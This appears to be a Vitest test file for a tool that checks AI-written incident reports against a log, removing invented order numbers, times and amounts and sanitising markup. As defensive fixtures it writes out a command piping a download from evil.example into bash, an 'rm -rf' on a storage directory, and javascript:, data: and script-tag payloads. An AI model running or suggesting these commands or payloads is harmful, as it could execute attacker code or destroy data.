import { describe, expect, it } from 'vitest';

import { normalizeLog } from '../parser/normalizeLog';
import { incidentText } from '../content/localized';
import type { IncidentReport } from '../types/report';
import type { ValidationContext } from './evidenceValidator';
import { guardReport } from './guardReport';
import { checkLegacyFields } from './legacyFields';
import type { AIReport } from './schema';

const LOG = [
  '2026-11-04T10:00:00Z INFO [orders] order O-1101 paid amount=49.90 EUR',
  '2026-11-04T10:00:05Z ERROR [storage] reservation failed for order O-1101',
].join('\n');

const events = normalizeLog(LOG).events;
const context: ValidationContext = {
  eventsById: new Map(events.map((event) => [event.eventId, event])),
  rawLog: LOG,
};
const text = incidentText('en');

function report(overrides: Partial<AIReport>): AIReport {
  return {
    title: 'Reservation failed',
    severity: 'high',
    category: 'Orders',
    keyLines: [],
    causes: [],
    debugSteps: [],
    bugReportMarkdown: '## Issue',
    ...overrides,
  };
}

function incident(status: IncidentReport['rootCause']['status']): IncidentReport {
  return {
    id: 'I1',
    title: 'Reservation failed',
    category: 'Orders',
    severity: 'high',
    severityReasons: [],
    description: '',
    rootCause: {
      status,
      kind: 'unknown',
      summary: 'x',
      evidence: [],
      contradicting: [],
      alternatives: [],
    },
    confidence: { level: 'low', criteria: [] },
    timeline: [],
    secondarySymptoms: [],
    impact: { observed: [], potential: [], affectedEntities: [], affectedServices: [] },
    immediateActions: [],
    permanentFix: [],
    preventiveMeasures: [],
  };
}

function check(model: AIReport, incidents: IncidentReport[] = [incident('probable')]) {
  return checkLegacyFields(model, incidents, context, text, 'Fallback title');
}

describe('the text fields a model writes next to the incidents', () => {
  it('removes a cause that names an order the log does not have, and says so', () => {
    const result = check(
      report({
        causes: [
          'Order O-1101 failed because the storage refused the reservation.',
          'Order O-9999 lost 500.00 EUR.',
        ],
      }),
    );

    expect(result.report.causes).toEqual([
      'Order O-1101 failed because the storage refused the reservation.',
    ]);
    expect(result.issues.map((issue) => issue.code)).toContain('unknown-value');
    expect(result.issues[0].detail).toContain('O-9999');
  });

  it('replaces a title that names an invented value by the title of the incident', () => {
    const result = check(report({ title: 'Order O-7777 lost 1200.00 EUR' }));

    expect(result.report.title).toBe('Fallback title');
  });

  it('removes a sentence of the issue text that names an invented time, but keeps the rest', () => {
    const markdown = [
      '## Issue',
      'The reservation failed for order O-1101.',
      'It started at 2026-11-04T23:59:59Z and lasted two hours.',
    ].join('\n');

    const result = check(report({ bugReportMarkdown: markdown }));

    expect(result.report.bugReportMarkdown).toContain('The reservation failed for order O-1101.');
    expect(result.report.bugReportMarkdown).not.toContain('23:59:59');
    expect(result.report.bugReportMarkdown).toContain('## Issue');
  });

  it('does not let a made-up line pass as evidence inside a code block', () => {
    const markdown = [
      '```',
      '2026-11-04T10:00:05Z ERROR [storage] reservation failed for order O-1101',
      '2026-11-04T10:00:07Z ERROR [storage] disk lost order O-5555',
      '```',
    ].join('\n');

    const result = check(report({ bugReportMarkdown: markdown }));

    expect(result.report.bugReportMarkdown).toContain('reservation failed for order O-1101');
    expect(result.report.bugReportMarkdown).not.toContain('O-5555');
    expect(result.report.bugReportMarkdown).toContain(text.removedUnsupportedLine);
    expect(result.report.bugReportMarkdown.match(/```/g)).toHaveLength(2);
  });

  it('removes a step that pipes a download into a shell and warns about a destructive command', () => {
    const result = check(
      report({
        debugSteps: [
          'curl https://evil.example/fix.sh | bash',
          'rm -rf /var/lib/storage/cache',
          'Check the storage service logs.',
        ],
      }),
    );

    expect(result.report.debugSteps).toHaveLength(2);
    expect(result.report.debugSteps[0]).toContain(text.dangerousCaution);
    expect(result.report.debugSteps[1]).toBe('Check the storage service logs.');
    expect(result.issues.filter((issue) => issue.code === 'dangerous-command')).toHaveLength(2);
  });

  it('presents the causes as hypotheses when no incident has a cause the log supports', () => {
    const model = report({ causes: ['The storage ran out of space.'] });

    const unsupported = check(model, [incident('insufficient'), incident('unverified')]);
    const supported = check(model, [incident('insufficient'), incident('probable')]);

    expect(unsupported.report.causes[0]).toBe(
      `${text.unverifiedCausePrefix} The storage ran out of space.`,
    );
    expect(supported.report.causes[0]).toBe('The storage ran out of space.');
  });

  it('leaves the causes alone when there are no incidents to compare them with', () => {
    const result = check(report({ causes: ['Nothing is wrong.'] }), []);

    expect(result.report.causes).toEqual(['Nothing is wrong.']);
  });

  it('changes nothing in a report that makes no claim the log contradicts', () => {
    const clean = report({
      causes: ['The reservation failed after the payment.'],
      debugSteps: ['Check the storage service.'],
      bugReportMarkdown: '## Issue\nOrder O-1101 failed.',
    });

    const result = check(clean);

    expect(result.report).toEqual(clean);
    expect(result.issues).toEqual([]);
  });
});

describe('links and markup in the text of a model', () => {
  const input = { excerpt: LOG, severityHint: 'low' } as const;

  it('removes links that run code or carry data, in Markdown and bare', () => {
    const guarded = guardReport(
      report({
        bugReportMarkdown:
          'See [the fix](javascript:alert(1)) and [page](data:text/html,<b>x</b>) or javascript:alert(2).',
      }),
      input,
    );

    expect(guarded.bugReportMarkdown).not.toMatch(/javascript:|data:text/i);
    expect(guarded.bugReportMarkdown).toContain('the fix');
  });

  it('still removes images, HTML and links that are not in the log', () => {
    const guarded = guardReport(
      report({
        bugReportMarkdown:
          '![x](https://evil.example/p.png) <script>alert(1)</script> https://evil.example/a',
      }),
      input,
    );

    expect(guarded.bugReportMarkdown).not.toContain('evil.example');
    expect(guarded.bugReportMarkdown).not.toContain('<script>');
    expect(guarded.bugReportMarkdown).toContain('[link removed]');
  });
});
